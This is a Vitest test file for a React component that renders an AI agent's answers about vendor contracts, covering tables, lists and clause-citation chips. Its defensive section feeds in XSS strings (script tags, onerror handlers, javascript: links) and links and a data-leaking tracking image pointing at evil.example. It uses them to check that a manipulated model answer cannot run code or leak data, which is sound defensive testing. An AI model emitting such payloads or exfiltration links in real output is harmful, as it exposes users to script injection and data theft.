// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { AnswerText } from "@/components/Agent/AnswerText";

afterEach(cleanup);

describe("AnswerText", () => {
  it("shows plain text", () => {
    render(<AnswerText text="You owe $500 in the next 30 days." />);
    expect(screen.getByText("You owe $500 in the next 30 days.")).toBeTruthy();
  });

  it("shows a markdown table as a real table", () => {
    render(<AnswerText text={"| Vendor | Fee |\n|---|---|\n| Grand Oak Estate | $450 |\n| Lumen | $0 |"} />);
    expect(screen.getByRole("table")).toBeTruthy();
    expect(screen.getAllByRole("columnheader").map((c) => c.textContent)).toEqual(["Vendor", "Fee"]);
    expect(screen.getAllByRole("row")).toHaveLength(3);
    expect(screen.getByRole("cell", { name: "$450" })).toBeTruthy();
  });

  it("shows bold and lists", () => {
    const { container } = render(<AnswerText text={"**Total: $1,330**\n\n- first\n- second"} />);
    expect(container.querySelector("strong")?.textContent).toBe("Total: $1,330");
    expect(screen.getAllByRole("listitem").map((li) => li.textContent)).toEqual(["first", "second"]);
  });

  describe("clause chips", () => {
    const oak = { label: "Grand Oak Estate contract, page 2", vendorId: "v 1", clauseId: "c/9", page: 2, text: "A 50% refund applies with 90 days' notice." };

    it("turns a citation a tool returned into a chip that opens the clause and links to the contract", () => {
      render(<AnswerText text="You get $1,500 back (Grand Oak Estate contract, page 2)." sources={[oak]} />);
      const chip = screen.getByRole("button", { name: "Grand Oak Estate contract, page 2" });
      fireEvent.click(chip);
      expect(screen.getByText(/A 50% refund applies/)).toBeTruthy();
      expect(screen.getByRole("link", { name: "Open in contract" }).getAttribute("href")).toBe("/vendors/v%201?clause=c%2F9");
    });

    it("makes chips in table cells and list items too", () => {
      render(<AnswerText text={"| Vendor | Source |\n|---|---|\n| Oak | Grand Oak Estate contract, page 2 |\n\n- See Grand Oak Estate contract, page 2"} sources={[{ ...oak, text: null }]} />);
      expect(screen.getAllByRole("link", { name: "Grand Oak Estate contract, page 2" })).toHaveLength(2);
    });

    it("leaves a citation no tool returned as plain text", () => {
      render(<AnswerText text="Per (Invented Vendor contract, page 7)." sources={[oak]} />);
      expect(screen.queryByRole("button")).toBeNull();
      expect(screen.queryByRole("link")).toBeNull();
      expect(screen.getByText("Per (Invented Vendor contract, page 7).")).toBeTruthy();
    });

    it("still removes links the model writes, even next to a chip", () => {
      render(<AnswerText text="[click](https://evil.example) Grand Oak Estate contract, page 2" sources={[{ ...oak, text: null }]} />);
      const links = screen.getAllByRole("link");
      expect(links.map((l) => l.getAttribute("href"))).toEqual(["/vendors/v%201?clause=c%2F9"]);
    });
  });

  describe("never turns the model's text into live HTML", () => {
    it("shows raw HTML as text instead of running it", () => {
      const { container } = render(<AnswerText text={'Hello <script>alert(1)</script> <img src=x onerror="alert(2)"> <b onclick="x()">bold</b>'} />);
      expect(container.querySelector("script")).toBeNull();
      expect(container.querySelector("img")).toBeNull();
      expect(container.querySelector("b")).toBeNull();
      expect(container.querySelector("[onerror], [onclick]")).toBeNull(); // no element carries a handler
      expect(container.textContent).toContain("alert(1)"); // the markup is shown as harmless text
      expect(container.textContent).toContain('onerror="alert(2)"');
    });

    it("removes links, keeping their text, so a manipulated answer can't send the couple anywhere", () => {
      const { container } = render(<AnswerText text="Please [click here](https://evil.example/pay) or see <https://evil.example>." />);
      expect(container.querySelector("a")).toBeNull();
      expect(container.textContent).toContain("click here");
      expect(container.innerHTML).not.toContain("href");
    });

    it("removes images, so nothing can be loaded or used to leak data", () => {
      const { container } = render(<AnswerText text="![pixel](https://evil.example/track.png?data=secret)" />);
      expect(container.querySelector("img")).toBeNull();
      expect(container.innerHTML).not.toContain("evil.example");
    });

    it("does not run javascript: links", () => {
      const { container } = render(<AnswerText text="[x](javascript:alert(1))" />);
      expect(container.querySelector("a")).toBeNull();
      expect(container.innerHTML).not.toContain("javascript:");
    });
  });

  it("renders an empty answer without crashing", () => {
    expect(() => render(<AnswerText text="" />)).not.toThrow();
  });
});
